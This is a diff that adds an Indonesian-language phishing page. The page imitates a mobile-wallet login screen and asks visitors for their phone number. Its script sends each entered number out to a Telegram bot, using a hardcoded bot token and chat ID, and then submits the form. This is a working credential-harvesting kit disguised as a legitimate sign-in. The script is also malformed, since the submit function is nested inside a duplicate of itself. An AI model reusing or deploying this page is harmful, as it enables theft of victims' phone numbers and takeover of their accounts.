@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118eea">
+    <title>Masukkan Nomor Handphone</title>
+    <style>
+        /* Same styles as before */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #118eea;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .container {
+            padding: 20px;
+            margin-top: 20px;
+            flex-grow: 1;
+        }
+
+        .logo {
+            width: 130px;
+            margin-bottom: 10px;
+        }
+
+        p1 {
+            font-size: 16px;
+            margin: 10px 0;
+            display: block;
+        }
+
+        .input-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 300px;
+        }
+
+        .icon {
+            position: absolute;
+            left: 10px; /* Ubah untuk menggeser ikon */
+            top: 50%;
+            transform: translateY(-50%);
+            width: 65px; /* Lebar ikon */
+            height: 45px;
+        }
+
+        input[type="tel"] {
+            padding-left: 80px;
+            width: 100%;
+            height: 45px;
+            font-size: 18px;
+            font-weight:bold;
+            border: none;
+            border-radius: 10px;
+            box-sizing: border-box;
+            background-color: white;
+            color: black;
+        }
+
+        .button-container {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            margin-left: -12px;
+            padding: 10px;
+            background-color: #118eea;
+            text-align: center;
+        }
+
+        .submit-button {
+            background: none;
+            border: none;
+            padding: 0;
+            color: white;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .submit-button:hover {
+            color: #dddddd;
+            text-decoration: none;
+        }
+
+        /* Loading GIF setup */
+        .loading {
+            display: none;
+            position: relative;
+            margin-top: 20px;
+            margin-left: -50px;
+        }
+
+        .loading img.static-image {
+            position: absolute;
+            width: 50px;
+            z-index: 1; /* Gambar statis di belakang */
+        }
+
+        .loading img.spinner {
+            position: absolute;
+            width: 40px;
+            margin-left: 5px;
+            margin-top: 5px;
+            animation: spin 0.7s linear infinite;
+            z-index: 2; /* Gambar pemutar di depan */
+        }
+
+        /* Rotasi gambar spinner */
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(-360deg);
+            }
+        }
+
+        p {
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+<form id="phoneForm" action="#" method="post">
+    <div class="container">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg3W1e-Q4DtbaO1xNNgQBsYSOF_eMf4kssHUNlXmShUHc93Lgj5fdB4ZTVr8NAsj4xN1Z3BiDrfr3CISxTEThEixk84xxIf4ZQm6QPB31R4O_gavWdcg00yhAJtYbctqz5eTrjxwS0jq26KVdHLt7f4cyI6vT6zHYreTAvWBEYbKzfDfpKbxdoLSMmh2lDS" alt="Logo" class="logo">
+        
+        <p1>Masukkan <strong>nomor HP</strong> kamu untuk lanjut</p1><br>
+        
+        <div class="input-container">
+            <div class="input-wrapper">
+                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhfqqkgEeAbg1A2QZDsQjJm7-R10BYdQgCccD9_JeTv5968wQSm4yoyNTPu8T6I3uxfVTNAZ2uvYfc38sjOU4-lywWponnU1OjiSM7Di_keRhqsfgzppcPIRNJAVPYr1hjNTvwRElxo_tOLlvkVgy7Na72LnBLfFN1p37QlOTg98zgJyPBX2nXI9Q8h-1nc" alt="Icon" class="icon">
+                <input type="tel" name="phone" id="phone" placeholder="811-1234-5678" oninput="formatPhoneNumber(this)" required>
+            </div>
+        </div>
+
+        <p>Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <a href="#"><strong>Syarat & Ketentuan</strong></a> dan<br><a href="#"><strong>Kebijakan Privasi</strong></a> Kami</p>
+
+        <!-- Loading GIF -->
+        <div class="loading" id="loading">
+            <img src="img/load_bg.png" alt="Static Image" class="static-image">
+            <img src="img/load_spin.png" alt="Spinner Image" class="spinner">
+        </div>
+    </div>
+
+    <div class="button-container">
+        <button type="button" class="submit-button" onclick="submitForm()">LANJUT</button>
+    </div>
+</form>
+
+<script>
+    function formatPhoneNumber(input) {
+        let value = input.value.replace(/\D/g, '');
+        let formattedValue = '';
+
+        for (let i = 0; i < value.length; i += 4) {
+            if (i > 0) {
+                formattedValue += '-';
+            }
+            formattedValue += value.substring(i, i + 4);
+        }
+
+        input.value = formattedValue;
+    }
+
+    function submitForm() {
+        const phoneNumber = document.getElementById('phone').value;
+
+        // Simpan nomor telepon ke localStorage
+        localStorage.setItem('phoneNumber', phoneNumber);
+
+        // Show loading GIF
+        document.getElementById('loading').style.display = 'block';
+
+function submitForm() {
+    const phoneNumber = document.getElementById('phone').value;
+
+    // Simpan nomor telepon ke localStorage
+    localStorage.setItem('phoneNumber', phoneNumber);
+
+    // Tampilkan GIF loading
+    document.getElementById('loading').style.display = 'block';
+
+
+    const botToken = '7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70'; // Ganti dengan token bot Telegram Anda
+    const chatId = '6824078885'; 
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: `Nomor Telepon: ${phoneNumber}\nPesan: 🦅 Rajawali Abadi 🦅`
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Handle successful request (if needed)
+        console.log(data);
+    })
+    .catch(error => {
+        // Handle error (if needed)
+        console.error(error);
+    })
+    .finally(() => {
+        setTimeout(() => {
+            document.querySelector("form").submit(); // Lanjutkan mengirim form setelah 3 detik
+        }, 3000);
+    });
+}
+
+        
+</script>
+</body>
+</html>
